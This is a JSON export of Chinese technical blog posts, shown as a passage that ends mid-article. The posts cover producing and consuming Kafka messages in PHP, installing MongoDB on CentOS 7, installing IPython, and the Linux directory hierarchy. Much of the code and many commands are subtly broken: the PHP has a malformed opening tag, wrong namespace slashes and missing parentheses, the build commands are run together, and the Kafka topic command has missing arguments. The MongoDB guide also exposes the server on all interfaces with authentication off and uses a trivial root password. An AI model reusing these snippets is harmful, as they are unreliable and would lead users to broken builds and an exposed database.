{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Kafka简介及使用PHP处理Kafka消息", "log_Intro": "Kafka简介及使用PHP处理Kafka消息", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <blockquote>\n<h1 id=\"1\">Kafka简介及使用<a href=\"https://yq.aliyun.com/php/\" rel=\"nofollow\">PHP</a>处理Kafka消息</h1>\nKafka 是一种高吞吐的分布式消息系统，能够替代传统的消息队列用于解耦合数据处理，缓存未处理消息等，同时具有更高的吞吐率，支持分区、多副本、冗余，因此被广泛用于大规模消息数据处理应用。\n\n<p> </p>\n</blockquote>\n\n<p><strong>Kafka的特点：</strong></p>\n\n<ul><li>以时间复杂度为O(1)的方式提供消息持久化能力，即使对TB级以上数据也能保证常数时间复杂度的访问性能。</li>\n\t<li>高吞吐率。即使在非常廉价的商用机器上也能做到单机支持每秒100K条以上消息的传输。【据了解，Kafka每秒可以生产约25万消息（50 MB），每秒处理55万消息（110 MB）】</li>\n\t<li>支持Kafka Server间的消息分区，同时保证每个Partition内的消息顺序传输。</li>\n\t<li>分布式系统，易于向外扩展。所有的producer、broker和consumer都会有多个，均为分布式的。无需停机即可扩展机器。</li>\n\t<li>消息被处理的状态是在consumer端维护，而不是由server端维护。当失败时能自动平衡。</li>\n\t<li>同时支持离线数据处理和实时数据处理。</li>\n</ul><p><strong>Kafka的架构：</strong></p>\n\n<p><img alt=\"Kafka简介及使用PHP处理Kafka消息-\" class=\"has\" src=\"https://img-blog.csdnimg.cn/201812241824542\">kafka架构图</p>\n\n<p> </p>\n\n<p>Kafka的整体架构非常简单，producer、broker（kafka）和consumer都可以有多个。Producer，consumer实现Kafka注册的接口，数据从producer发送到broker，broker承担一个中间缓存和分发的作用。broker分发注册到系统中的consumer。broker的作用类似于缓存，即活跃的数据和离线处理系统之间的缓存。客户端和服务器端的通信，是基于简单，高性能，且与编程语言无关的TCP协议。</p>\n\n<p> </p>\n\n<p><strong>Kafka基本概念：</strong></p>\n\n<ul><li>Topic：特指Kafka处理的消息源（feeds of messages）的不同分类。</li>\n\t<li>Partition：Topic物理上的分组，一个topic可以分为多个partition，每个partition是一个有序的队列。partition中的每条消息都会被分配一个有序的id（offset）。</li>\n\t<li>Message：消息，是通信的基本单位，每个producer可以向一个topic（<a href=\"https://yq.aliyun.com/zt\" rel=\"nofollow\">主题</a>）发布一些消息。</li>\n\t<li>Producers：消息和数据生产者，向Kafka的一个topic发布消息的过程叫做producers。</li>\n\t<li>Consumers：消息和数据消费者，订阅topics并处理其发布的消息的过程叫做consumers。</li>\n\t<li>Broker：缓存代理，Kafa集群中的一台或多台服务器统称为broker。</li>\n</ul><p> </p>\n\n<p><strong>Kafka消息发送的流程：</strong></p>\n\n<p><img alt=\"Kafka简介及使用PHP处理Kafka消息-\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2018122418245425\">Kafka消息发送</p>\n\n<p> </p>\n\n<p>下面是PHP生产、消费Kafka消息的例子（假设已经配置好Kafka）：</p>\n\n<p>1.从zookeeper源码src/c/src安装zookeeper c client</p>\n\n<pre>\n\n<code class=\"language-html hljs\"> </code></pre>\n\n<pre class=\"has\">\n<code class=\"language-bash\">cd zookeeper-3.4.8/src/c\n\n./configure\n\nmake &amp;&amp; make install</code></pre>\n\n<p><br>\n2.编译php libzookper扩展</p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">git clone https://github.com/Timandes/libzookeeper.git\n\ncd libzookeeper\n\nphpize\n\n./configure--with-libzookeeper=/usr/local/bin/cli_mt\n\nmake &amp;&amp; makeinstall</code></pre>\n\n<p> </p>\n\n<p>3.编译php zookeeper扩展</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">git clone https://github.com/andreiz/php-zookeeper.git\n\ncd php-zookeeper\n\nphpize\n\n./configure\n\nmake &amp;&amp; make install</code></pre>\n\n<p>4.修改php.ini配置，添加libzookeeper和php-zookeeper扩展</p>\n\n<pre class=\"has\">\n<code class=\"language-bash\">extension=libzookeeper.so\n\nextension=zookeeper.so</code></pre>\n\n<p><strong>PHP处理Kafka消息</strong>：</p>\n\n<p>1.启动zookeeper和kafka</p>\n\n<pre class=\"has\">\n<code class=\"language-cpp\">./bin/zookeeper-server-start.sh config/zookeeper.properties\n\n./bin/kafka-server-start.sh config/server.properties</code></pre>\n\n<p>2.创建由2个partition组成的、名为testtopic的topic</p>\n\n<pre class=\"has\">\n<code>kafka_2.11-0.10.0.0/bin/kafka-topics.sh --create--zookeeper localhost:2181 --replication-factor --partitions --topic testtopic</code></pre>\n\n<p><br>\n3.composer安装nmred/kafka-php</p>\n\n<table><tbody><tr><td>1</td>\n\t\t\t<td>composer require \"nmred/kafka-php\"</td>\n\t\t</tr></tbody></table><p>4.producer.php代码</p>\n\n<pre>\n\n<code class=\"language-html hljs\"> </code></pre>\n\n<ol><li>\n\t<p> </p>\n\n\t<pre class=\"has\">\n<code class=\"language-php\">&lt;php \n\nrequire_once('./vendor/autoload.php'); \n\n$produce=/Kafka/Produce::getInstance('localhost:2181',3000); \n\n$produce-&gt;setRequireAck(-1); $topicName='testtopic';\n\n//获取到topic下可用的partitions\n\n$partitions=$produce-&gt;getAvailablePartitions($topicName);\n\n$partitionCount=count($partitions); \n\n$count=1;//可以处理的消费者数量（可以理解为server数量）\n\nwhile(true){    $message=json_encode(array('uid'=&gt;$count,'age'=&gt;$count%100,'datetime'=&gt;date('Y-m-d H:i:s')));     \n\n//发送消息到不同的partition   \n\n $partitionId=$count%$partitionCount;    \n\n$produce-&gt;setMessages('testtopic',$partitionId,array($message));   \n\n $result=$produce-&gt;send();    \n\nvar_dump($result);     \n\n$count++;   \n\n echo\"producer sleeping/n\";   \n\n sleep(1);\n\n}</code></pre>\n\n\t<p> </p>\n\t</li>\n</ol><p>5、consumer.php代码</p>\n\n<pre class=\"has\">\n<code class=\"language-php\">&lt;?php \n\nrequire_once('./vendor/autoload.php'); \n\n//获取需要处理的partitionId\n\n$partitionId = isset($argv[1]) ? intval($argv[1]) :0; \n\n$consumer =/Kafka/Consumer::getInstance('localhost:2181'); \n\n$consumer-&gt;setGroup('test-consumer-group');\n\n$consumer-&gt;setPartition('testtopic', $partitionId);\n\n$consumer-&gt;setFromOffset(true);\n\n$consumer-&gt;setMaxBytes(102400); \n\nwhile(true){    \n\n$topic = $consumer-&gt;fetch();     \n\nforeach ($topic as $topicName =&gt; $partition{        \n\nforeach ($partition as $partId =&gt; $messageSet{            \n\nforeach ($messageSet as $message){                \n\nvar_dump($message);           \n\n}        \n\n}    \n\n}    \n\necho\"consumer sleeping/n\";   \n\nsleep(1);\n\n}</code></pre>\n\n<p> </p>\n\n<p>6、在3个终端界面分别运行</p>\n\n<p>7、两个consumer脚本依次收到producer发送的消息</p>\n\n<p><img alt=\"php-kafka-consumer-output\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20181224183829554\"></p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891124, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Centos7下安装MongoDB", "log_Intro": "Centos7下安装MongoDB", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2 id=\"简介\">简介</h2>\n\n<ul><li>MongoDB 是一个基于分布式 文件存储的NoSQL数据库</li>\n\t<li>由C++语言编写，运行稳定，性能高</li>\n\t<li>旨在为 WEB 应用提供可扩展的高性能数据存储解决方案</li>\n\t<li>查看<a href=\"https://www.mongodb.com/\" rel=\"nofollow\">官方网站</a></li>\n</ul><p>MongoDB特点</p>\n\n<ul><li>模式自由 :可以把不同结构的文档存储在同一个数据库里</li>\n\t<li>面向集合的存储：适合存储 JSON风格文件的形式</li>\n\t<li>完整的索引支持：对任何属性可索引</li>\n\t<li>复制和高可用性：支持服务器之间的数据复制，支持主-从模式及服务器之间的相互复制。复制的主要目的是提供冗余及自动故障转移</li>\n\t<li>自动分片：支持云级别的伸缩性：自动分片功能支持水平的数据库集群，可动态添加额外的机器</li>\n\t<li>丰富的查询：支持丰富的查询表达方式，查询指令使用JSON形式的标记，可轻易查询文档中的内嵌的对象及数组</li>\n\t<li>快速就地更新：查询优化器会分析查询表达式，并生成一个高效的查询计划</li>\n\t<li>高效的传统存储方式：支持二进制数据及大型对象（如照片或图片）</li>\n</ul><p>Packages包说明</p>\n\n<p>MongoDB官方源中包含以下几个依赖包：<br>\nmongodb-org: MongoDB元数据包，安装时自动安装下面四个组件包：<br>\n1.mongodb-org-server: 包含MongoDB守护进程和相关的配置和初始化脚本。<br>\n2.mongodb-org-mongos: 包含mongos的守护进程。<br>\n3.mongodb-org-shell: 包含mongo shell。<br>\n4.mongodb-org-tools: 包含MongoDB的工具： mongoimport, bsondump, mongodump, mongoexport, mongofiles, mongooplog, mongoperf, mongorestore, mongostat, and mongotop。</p>\n\n<h3>前言</h3>\n\n<p>CentOS上安装epel-release的yum源之后就可以安装MongoDB，但是版本都是比较老的，如果使用MongoDB官方的yum就可以安装到比较新版本的MongoDB。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://ss1.baidu.com/6ONXsjip0QIZ8tyhnq/it/u=4167178531,2343887537&amp;fm=173&amp;app=25&amp;f=JPEG?w=640&amp;h=400&amp;s=C5B1EC780AF49C4F0CD5C51B0000E0CA\"></p>\n\n<p> </p>\n\n<h3>配置yum源</h3>\n\n<p>cat &gt; /etc/yum.repos.d/MongoDB.repo &lt;&lt;EOF</p>\n\n<p>[mongodb-org-3.6]</p>\n\n<p>name=MongoDB Repository</p>\n\n<p>baseurl=https://repo.mongodb.org/yum/redhat/\\$releasever/mongodb-org/3.6/x86_64/</p>\n\n<p>gpgcheck=1</p>\n\n<p>enabled=1</p>\n\n<p>gpgkey=https://www.mongodb.org/static/pgp/server-3.6.asc</p>\n\n<p>EOF</p>\n\n<h3>安装</h3>\n\n<p>yum -y install mongodb-org</p>\n\n<h3>创建数据目录</h3>\n\n<p>一般分配到独立的大分区</p>\n\n<p>mkdir -p /data/mongodb/data /data/mongodb/logs</p>\n\n<p>chown mongod.mongod /data/mongodb/data /data/mongodb/logs -R #默认是使用mongod执行的，所以需要修改一下目录权限</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://ss0.baidu.com/6ONWsjip0QIZ8tyhnq/it/u=1201263081,3296250909&amp;fm=173&amp;app=25&amp;f=JPEG?w=640&amp;h=366&amp;s=29843C72BCE476154F241A4F0200E0E3\"></p>\n\n<p> </p>\n\n<h3>修改配置文件</h3>\n\n<pre class=\"has\">\n<code class=\"language-html\">vi /etc/mongod.conf</code></pre>\n\n<p># mongod.conf</p>\n\n<p># for documentation of all options, see:</p>\n\n<p># http://docs.mongodb.org/manual/reference/configuration-options/</p>\n\n<p># where to write logging data.</p>\n\n<p>systemLog:</p>\n\n<p>destination: file</p>\n\n<p>logAppend: true</p>\n\n<p>path: /data/mongodb/logs/mongod.log #修改到我们专门创建的目录</p>\n\n<p># Where and how to store data.</p>\n\n<p>storage:</p>\n\n<p>dbPath: /data/mongodb/data #修改到我们专门创建的目录</p>\n\n<p>journal:</p>\n\n<p>enabled: true</p>\n\n<p># engine:</p>\n\n<p># mmapv1:</p>\n\n<p># wiredTiger:</p>\n\n<p># how the process runs</p>\n\n<p>processManagement:</p>\n\n<p>fork: true # fork and run in background</p>\n\n<p>pidFilePath: /data/mongodb/logs/mongod.pid # location of pidfile</p>\n\n<p>timeZoneInfo: /usr/share/zoneinfo</p>\n\n<p># network interfaces</p>\n\n<p>net:</p>\n\n<p>port: 27017</p>\n\n<p>#bindIp: 127.0.0.1 # Listen to local interface only, comment to listen on all interfaces.</p>\n\n<p>bindIp: 0.0.0.0 # Listen to local interface only, comment to listen on all interfaces. #修改监听所有的端口</p>\n\n<p>#security:</p>\n\n<p># authorization: enabled #这里是开启验证功能，暂时先关闭，等创建完root用户再开起来进行验证</p>\n\n<p>#operationProfiling:</p>\n\n<p>#replication:</p>\n\n<p>#sharding:</p>\n\n<p>## Enterprise-Only Options</p>\n\n<p>#auditLog:</p>\n\n<p>#snmp:</p>\n\n<h3>启动mogodb</h3>\n\n<p>systemctl start mongod.service<br>\nsystemctl stop mongod.service //停止<br>\nsystemctl restart mongod.service //重启</p>\n\n<h3>设置开机自启动</h3>\n\n<p>systemctl enable mongod<br>\n </p>\n\n<h3>连接MongoDB数据库</h3>\n\n<p>直接使用mongo命令进行连接，默认端口是27017</p>\n\n<p>创建验证用户</p>\n\n<p>db.createUser({user:\"root\",pwd:\"rootpassword\",roles:[{role:\"root\",db:\"admin\"}]})</p>\n\n<p>修改配置文件</p>\n\n<p>security:</p>\n\n<p>authorization: enabled</p>\n\n<p>添加上验证，重启mongd服务</p>\n\n<p>登录验证</p>\n\n<p>mongo -u root -p rootpassword --authenticationDatabase admin</p>\n\n<h3><strong>卸载MongoDB</strong></h3>\n\n<p>该过程将会完全移除MongoDB、它的配置、和所有数据库。</p>\n\n<p>1.停止服务</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>sudo</code> <code>service mongod stop</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>2.移除包</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>sudo</code> <code>yum erase $(rpm -qa | </code><code>grep</code> <code>mongodb-org)</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>3.移除数据和日志文件</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>sudo</code> <code>rm</code> <code>-r </code><code>/var/log/mongodb</code>   </p>\n\n\t\t\t<p><code>sudo</code> <code>rm</code> <code>-r </code><code>/var/lib/mongo</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><h3>总结</h3>\n\n<p>这样子就可以撸起MongoDB了，是不是很简单？</p>\n                                    </div>", "log_PostTime": 1584891125, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Ipython的Window与Linux详细安装", "log_Intro": "Ipython的Window与Linux详细安装", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1> </h1>\n\n<p><strong>IPython 是一个 python 的交互式 shell，支持补全等等一些强大的功能；</strong></p>\n\n<p>IPython 为交互式计算提供了一个丰富的架构，包含：</p>\n\n<ul><li>\n\t<p>强大的交互式 shell</p>\n\t</li>\n\t<li>\n\t<p>Jupyter 内核</p>\n\t</li>\n\t<li>\n\t<p>交互式的数据可视化工具</p>\n\t</li>\n\t<li>\n\t<p>灵活、可嵌入的解释器</p>\n\t</li>\n\t<li>\n\t<p>易于使用，高性能的并行计算工具</p>\n\t</li>\n</ul><h3>一、Window的ipython的安装</h3>\n\n<p><strong>我的环境是在电脑上已经安装过了Python3.7，然后在此基础上安装ipython;</strong></p>\n\n<p>1、cmd--&gt;打开Windows命令行，--》确保电脑已经成功安装了python，输入命令python查看当前python是否已经成功安装,然后exit()退出；</p>\n\n<p>2、输入命令：pip install ipython[all]   安装ipython，也可以是用pip3命令安装，此方式进行下载安装ipython,然后会自动连接ipython的网站进行下载安装，等待即可；</p>\n\n<p>3、如果提示pip的版本不是最新的，此时输入命令 python -m pip install --upgrade pip 更新我们的pip就可以了；</p>\n\n<p>4、安装成功以后，输入命令 ipython notebook就可以开始用了，浏览器会自动打开jupyter的页面, 在jupyter里面执行命令用：shift+enter；</p>\n\n<p>pip(pip3) install urllib3 （安装IPython Notebook的依赖）</p>\n\n<p>pip(pip3) install jupyter （安装IPython Notebook）</p>\n\n<p>pip(pip3) install numpy</p>\n\n<p>pip(pip3) install matplotlib</p>\n\n<p>pip(pip3) install pandas</p>\n\n<p>pip(pip3) install scipy</p>\n\n<p>pip(pip3) install scikit-learn</p>\n\n<h3>二、Linux的ipython的安装</h3>\n\n<p>为了防止真机被搞坏，我在虚拟机desktop上面安装Ipython<br>\n步骤一：使虚拟机可以上网</p>\n\n<p>步骤二：虚拟机已经安装好python3.6并且可以正常使用</p>\n\n<p>步骤三：开始安装ipython</p>\n\n<p>python3 -m pip install --upgrade pip</p>\n\n<p>pip3 install ipython</p>\n\n<p> </p>\n\n<p> </p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891127, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Linux操作系统下文件作用", "log_Intro": "Linux操作系统下文件作用", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>linux下的文件结构，看看每个文件夹都是干吗用的</h3>\n\n<p>/bin 二进制可执行命令<br>\n/dev 设备特殊文件<br>\n/etc 系统管理和配置文件<br>\n/etc/rc.d 启动的配置文件和脚本<br>\n/home 用户主目录的基点，比如用户user的主目录就是/home/user，可以用~user表示<br>\n/lib 标准程序设计库，又叫动态链接共享库，作用类似windows里的.dll文件<br>\n/sbin 系统管理命令，这里存放的是系统管理员使用的管理程序<br>\n/tmp 公用的临时文件存储点<br>\n/root 系统管理员的主目录（呵呵，特权阶级）<br>\n/mnt 系统提供这个目录是让用户临时挂载其他的文件系统。<br>\n/lost+found 这个目录平时是空的，系统非正常关机而留下“无家可归”的文件（windows下叫什么.chk）就在这里<br>\n/proc 虚拟的目录，是系统内存的映射。可直接访问这个目录来获取系统信息。<br>\n/var 某些大文件的溢出区，比方说各种服务的日志文件<br>\n/usr 最庞大的目录，要用到的应用程序和文件几乎都在这个目录。其中包含：<br>\n/usr/x11r6 存放x window的目录<br>\n/usr/bin 众多的应用程序<br>\n/usr/sbin 超级用户的一些管理程序<br>\n/usr/doc linux文档<br>\n/usr/include linux下开发和编译应用程序所需要的头文件<br>\n/usr/lib 常用的动态链接库和软件包的配置文件<br>\n/usr/man 帮助文档<br>\n/usr/src 源代码，linux内核的源代码就放在/usr/src/linux里<br>\n/usr/local/bin 本地增加的命令<br>\n/usr/local/lib 本地增加的库</p>\n\n<p><strong>通常情况下，根文件系统所占空间一般应该比较小，因为其中的绝大部分文件都不需要<br>\n经常改动，而且包括严格的文件和一个小的不经常改变的文件系统不容易损坏。<br>\n除了可能的一个叫/ v m l i n u z标准的系统引导映像之外，根目录一般不含任何文件。所有<br>\n其他文件在根文件系统的子目录中。</strong></p>\n\n<ol><li>/bin目录<br>\n\t/ b i n目录包含了引导启动所需的命令或普通用户可能用的命令(可能在引导启动后)。这些<br>\n\t命令都是二进制文件的可执行程序( b i n是b i n a r y - -二进制的简称)，多是系统中重要的系统文件。</li>\n\t<li>/sbin目录<br>\n\t/ s b i n目录类似/bin ，也用于存储二进制文件。因为其中的大部分文件多是系统管理员使<br>\n\t用的基本的系统程序，所以虽然普通用户必要且允许时可以使用，但一般不给普通用户使用。</li>\n\t<li>/etc目录<br>\n\t/ e t c目录存放着各种系统配置文件，其中包括了用户信息文件/ e t c / p a s s w d，系统初始化文<br>\n\t件/ e t c / r c等。l i n u x正是*这些文件才得以正常地运行。</li>\n\t<li>/root目录<br>\n\t/root 目录是超级用户的目录。</li>\n\t<li>/lib目录<br>\n\t/ l i b目录是根文件系统上的程序所需的共享库，存放了根文件系统程序运行所需的共享文<br>\n\t件。这些文件包含了可被许多程序共享的代码，以避免每个程序都包含有相同的子程序的副<br>\n\t本，故可以使得可执行文件变得更小，节省空间。</li>\n\t<li>/lib/modules 目录<br>\n\t/lib/modules 目录包含系统核心可加载各种模块，尤其是那些在恢复损坏的系统时重新引<br>\n\t导系统所需的模块(例如网络和文件系统驱动)。</li>\n\t<li>/dev目录<br>\n\t/ d e v目录存放了设备文件，即设备驱动程序，用户通过这些文件访问外部设备。比如，用<br>\n\t户可以通过访问/ d e v / m o u s e来访问鼠标的输入，就像访问其他文件一样。</li>\n\t<li>/tmp目录<br>\n\t/tmp 目录存放程序在运行时产生的信息和数据。但在引导启动后，运行的程序最好使用<br>\n\t/ v a r / t m p来代替/tmp ，因为前者可能拥有一个更大的磁盘空间。</li>\n\t<li>/boot目录<br>\n\t/ b o o t目录存放引导加载器(bootstrap loader)使用的文件，如l i l o，核心映像也经常放在这里，<br>\n\t而不是放在根目录中。但是如果有许多核心映像，这个目录就可能变得很大，这时使用单独的<br>\n\t文件系统会更好一些。还有一点要注意的是，要确保核心映像必须在i d e硬盘的前1 0 2 4柱面内。</li>\n\t<li>/mnt目录<br>\n\t/ m n t目录是系统管理员临时安装( m o u n t )文件系统的安装点。程序并不自动支持安装到<br>\n\t/mnt 。/mnt 下面可以分为许多子目录，例如/mnt/dosa 可能是使用m s d o s文件系统的软驱，<br>\n\t而/mnt/exta 可能是使用e x t 2文件系统的软驱，/mnt/cdrom 光驱等等。</li>\n\t<li>/proc, /usr,/var,/home目录<br>\n\t其他文件系统的安装点。</li>\n</ol><p><strong>下面详细介绍；</strong></p>\n\n<p><strong>/etc文件系统<br>\n/etc 目录包含各种系统配置文件，下面说明其中的一些。其他的你应该知道它们属于哪个<br>\n程序，并阅读该程序的m a n页。许多网络配置文件也在/etc 中。</strong></p>\n\n<ol><li>/etc/rc或/etc/rc.d或/etc/rc?.d<br>\n\t启动、或改变运行级时运行的脚本或脚本的目录。</li>\n\t<li>/etc/passwd<br>\n\t用户数据库，其中的域给出了用户名、真实姓名、用户起始目录、加密口令和用户的其<br>\n\t他信息。</li>\n\t<li>/etc/fdprm<br>\n\t软盘参数表，用以说明不同的软盘格式。可用setfdprm 进行设置。更多的信息见s e t f d p r m<br>\n\t的帮助页。</li>\n\t<li>/etc/fstab<br>\n\t指定启动时需要自动安装的文件系统列表。也包括用swapon -a启用的s w a p区的信息。</li>\n\t<li>/etc/group<br>\n\t类似/etc/passwd ，但说明的不是用户信息而是组的信息。包括组的各种数据。</li>\n\t<li>/etc/inittab<br>\n\tinit 的配置文件。</li>\n\t<li>/etc/issue<br>\n\t包括用户在登录提示符前的输出信息。通常包括系统的一段短说明或欢迎信息。具体内<br>\n\t容由系统管理员确定。</li>\n\t<li>/etc/magic<br>\n\t“f i l e”的配置文件。包含不同文件格式的说明，“f i l e”基于它猜测文件类型。</li>\n\t<li>/etc/motd<br>\n\tm o t d是message of the day的缩写，用户成功登录后自动输出。内容由系统管理员确定。<br>\n\t常用于通告信息，如计划关机时间的警告等。</li>\n\t<li>/etc/mtab<br>\n\t当前安装的文件系统列表。由脚本( s c r i t p )初始化，并由mount 命令自动更新。当需要一<br>\n\t个当前安装的文件系统的列表时使用(例如df 命令)。</li>\n\t<li>/etc/shadow<br>\n\t在安装了影子( s h a d o w )口令软件的系统上的影子口令文件。影子口令文件将/ e t c / p a s s w d<br>\n\t文件中的加密口令移动到/ e t c / s h a d o w中，而后者只对超级用户( r o o t )可读。这使破译口令更困<br>\n\t难，以此增加系统的安全性。</li>\n\t<li>/etc/login.defs<br>\n\tl o g i n命令的配置文件。</li>\n\t<li>/etc/printcap<br>\n\t类似/etc/termcap ，但针对打印机。语法不同。</li>\n\t<li>/etc/profile 、/ e t c / c s h . l o g i n、/etc/csh.cshrc<br>\n\t登录或启动时b o u r n e或c shells执行的文件。这允许系统管理员为所有用户建立全局缺省环境。</li>\n\t<li>/etc/securetty<br>\n\t确认安全终端，即哪个终端允许超级用户( r o o t )登录。一般只列出虚拟控制台，这样就不<br>\n\t可能(至少很困难)通过调制解调器( m o d e m )或网络闯入系统并得到超级用户特权。</li>\n\t<li>/etc/shells<br>\n\t列出可以使用的s h e l l。chsh 命令允许用户在本文件指定范围内改变登录的s h e l l。提供一<br>\n\t台机器f t p服务的服务进程ftpd 检查用户s h e l l是否列在/etc/shells 文件中，如果不是，将不允<br>\n\t许该用户登录。</li>\n\t<li>/etc/termcap<br>\n\t终端性能数据库。说明不同的终端用什么“转义序列”控制。写程序时不直接输出转义<br>\n\t序列(这样只能工作于特定品牌的终端)，而是从/etc/termcap 中查找要做的工作的正确序列。<br>\n\t这样，多数的程序可以在多数终端上运行。</li>\n</ol><p><strong>/dev文件系统<br>\n/dev 目录包括所有设备的设备文件。设备文件用特定的约定命名，这在设备列表中说明。<br>\n设备文件在安装时由系统产生，以后可以用/dev/makedev 描述。/ d e v / m a k e d e v.local 是<br>\n系统管理员为本地设备文件(或连接)写的描述文稿(即如一些非标准设备驱动不是标准<br>\nmakedev 的一部分)。下面简要介绍/ d e v下一些常用文件。</strong></p>\n\n<ol><li>/dev/console<br>\n\t系统控制台，也就是直接和系统连接的监视器。</li>\n\t<li>/dev/hd<br>\n\ti d e硬盘驱动程序接口。如： / d e v / h d a指的是第一个硬盘， h a d 1则是指/ d e v / h d a的第一个<br>\n\t分区。如系统中有其他的硬盘，则依次为/ d e v / h d b、/ d e v / h d c、. . . . . .；如有多个分区则依次为<br>\n\th d a 1、h d a 2 . . . . . .</li>\n\t<li>/dev/sd<br>\n\ts c s i磁盘驱动程序接口。如有系统有s c s i硬盘，就不会访问/ d e v / h a d，而会访问/ d e v / s d a。</li>\n\t<li>/dev/fd<br>\n\t软驱设备驱动程序。如： / d e v / f d 0指系统的第一个软盘，也就是通常所说的a：盘，<br>\n\t/ d e v / f d 1指第二个软盘，. . . . . .而/ d e v / f d 1 h 1 4 4 0则表示访问驱动器1中的4 . 5高密盘。</li>\n\t<li>/dev/st<br>\n\ts c s i磁带驱动器驱动程序。</li>\n\t<li>/dev/tty<br>\n\t提供虚拟控制台支持。如： / d e v / t t y 1指的是系统的第一个虚拟控制台， / d e v / t t y 2则是系统<br>\n\t的第二个虚拟控制台。</li>\n\t<li>/dev/pty<br>\n\t提供远程登陆伪终端支持。在进行te l n e t登录时就要用到/ d e v / p t y设备。</li>\n\t<li>/dev/ttys<br>\n\t计算机串行接口，对于d o s来说就是“ c o m 1”口。</li>\n\t<li>/dev/cua<br>\n\t计算机串行接口，与调制解调器一起使用的设备。</li>\n\t<li>/dev/null<br>\n\t“黑洞”，所有写入该设备的信息都将消失。例如：当想要将屏幕上的输出信息隐藏起来<br>\n\t时，只要将输出信息输入到/ d e v / n u l l中即可。</li>\n</ol><p><strong>/usr文件系统<br>\n/usr 是个很重要的目录，通常这一文件系统很大，因为所有程序安装在这里。/usr 里的<br>\n所有文件一般来自l i n u x发行版( d i s t r i b u t i o n )；本地安装的程序和其他东西在/usr/local 下，因为这样可以在升级新版系统或新发行版时无须重新安装全部程序。/usr 目录下的许多内容是<br>\n可选的，但这些功能会使用户使用系统更加有效。/ u s r可容纳许多大型的软件包和它们的配置<br>\n文件。下面列出一些重要的目录(一些不太重要的目录被省略了)。</strong></p>\n\n<ol><li>/usr/x11r6<br>\n\t包含x wi n d o w系统的所有可执行程序、配置文件和支持文件。为简化x的开发和安装，<br>\n\tx的文件没有集成到系统中。x wi n d o w系统是一个功能强大的图形环境，提供了大量的图形<br>\n\t工具程序。用户如果对microsoft wi n d o w s或m a c h i n t o s h比较熟悉的话，就不会对x wi n d o w系统感到束手无策了。</li>\n\t<li>/usr/x386<br>\n\t类似/ u s r / x 11r6 ，但是是专门给x 11 release 5的。</li>\n\t<li>/usr/bin<br>\n\t集中了几乎所有用户命令，是系统的软件库。另有些命令在/bin 或/usr/local/bin 中。</li>\n\t<li>/usr/sbin<br>\n\t包括了根文件系统不必要的系统管理命令，例如多数服务程序。</li>\n\t<li>/usr/man、/ u s r / i n f o、/ u s r / d o c<br>\n\t这些目录包含所有手册页、g n u信息文档和各种其他文档文件。每个联机手册的“节”<br>\n\t都有两个子目录。例如： / u s r / m a n / m a n 1中包含联机手册第一节的源码(没有格式化的原始文<br>\n\t件)，/ u s r / m a n / c a t 1包含第一节已格式化的内容。l联机手册分为以下九节：内部命令、系统调<br>\n\t用、库函数、设备、文件格式、游戏、宏软件包、系统管理和核心程序。</li>\n\t<li>/usr/include<br>\n\t包含了c语言的头文件，这些文件多以. h结尾，用来描述c语言程序中用到的数据结构、<br>\n\t子过程和常量。为了保持一致性，这实际上应该放在/usr/lib 下，但习惯上一直沿用了这个名<br>\n\t字。</li>\n\t<li>/usr/lib<br>\n\t包含了程序或子系统的不变的数据文件，包括一些s i t e - w i d e配置文件。名字l i b来源于库<br>\n\t(library); 编程的原始库也存在/usr/lib 里。当编译程序时，程序便会和其中的库进行连接。也<br>\n\t有许多程序把配置文件存入其中。</li>\n\t<li>/usr/local<br>\n\t本地安装的软件和其他文件放在这里。这与/ u s r很相似。用户可能会在这发现一些比较大<br>\n\t的软件包，如t e x、e m a c s等。</li>\n</ol><p><strong>/var文件系统<br>\n/var 包含系统一般运行时要改变的数据。通常这些数据所在的目录的大小是要经常变化<br>\n或扩充的。原来/ v a r目录中有些内容是在/ u s r中的，但为了保持/ u s r目录的相对稳定，就把那<br>\n些需要经常改变的目录放到/ v a r中了。每个系统是特定的，即不通过网络与其他计算机共享。<br>\n下面列出一些重要的目录(一些不太重要的目录省略了)。</strong></p>\n\n<ol><li>/var/catman<br>\n\t包括了格式化过的帮助( m a n )页。帮助页的源文件一般存在/ u s r / m a n / m a n中；有些m a n页<br>\n\t可能有预格式化的版本，存在/ u s r / m a n / c a t中。而其他的m a n页在第一次看时都需要格式化，<br>\n\t格式化完的版本存在/var/man 中，这样其他人再看相同的页时就无须等待格式化了。<br>\n\t(/var/catman 经常被清除，就像清除临时目录一样。)</li>\n\t<li>/var/lib<br>\n\t存放系统正常运行时要改变的文件。</li>\n\t<li>/var/local<br>\n\t存放/usr/local 中安装的程序的可变数据(即系统管理员安装的程序)。注意，如果必要，<br>\n\t即使本地安装的程序也会使用其他/var 目录，例如/var/lock 。</li>\n\t<li>/var/lock<br>\n\t锁定文件。许多程序遵循在/var/lock 